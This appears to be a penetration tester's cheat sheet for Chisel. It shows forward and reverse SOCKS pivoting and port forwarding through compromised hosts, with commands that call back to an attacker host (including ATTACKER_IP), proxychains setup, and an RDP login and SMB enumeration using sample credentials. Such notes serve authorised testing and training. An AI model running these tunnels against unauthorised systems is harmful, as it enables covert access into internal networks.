# Chisel

```
git clone https://github.com/jpillora/chisel.git
https://github.com/jpillora/chisel/releases
```

#### Build Binary

```
cd chisel
go build
```

### Forward Pivot

#### Run Server on Pivot Host

```
./chisel server -v -p 1234 --socks5
.\chisel.exe server -v -p 1234 --socks5
```

#### Connect to Chisel Server - Will Tell You the Listening Port to Put in proxychains.conf

```
./chisel client -v 192.168.49.125:1234 socks
.\chisel.exe client -v 192.168.49.125:1234 socks
```

#### Edit proxychains.conf

```
vim /etc/proxychains.conf
socks5 127.0.0.1 1080
```

#### Pivot

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@12345
```

### Reverse Pivot

#### Start Chisel on Attack Host

```
sudo ./chisel server --reverse -v -p 1234 --socks5
```

#### Connect to Server from Target

```
./chisel client -v 192.168.49.120:1234 R:socks
.\chisel.exe client -v 192.168.49.120:1234 R:socks
```

#### Edit proxychains.conf

```
vim /etc/proxychains.conf
socks5 127.0.0.1 1080
```

* chisel.exe works on Windows

### Reverse SOCKS Proxy (Full Example)

On attacker:

```bash
./chisel server -v --reverse
# Output:
# Reverse tunnelling enabled
# Listening on http://0.0.0.0:8080
```

On pivot host:

```bash
./chisel client ATTACKER_IP:8080 R:socks
# Output:
# Connected (Latency 44ms)
```

Attacker side confirms the tunnel:

```
session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Configure proxychains (`/etc/proxychains4.conf`):

```
socks5 127.0.0.1 1080
```

Now route tools through the tunnel:

```bash
proxychains nxc smb 172.16.119.10 -d DOMAIN -u user -p 'password' --shares
```

---

### Simple Port Forward / Reverse Port Forward

#### Attack box

```
./chisel_1.10.1_linux_arm64 server -p 8000 --reverse
```

#### Target

```
./c.exe client 10.10.14.5:8000 R:8888:localhost:8888
```
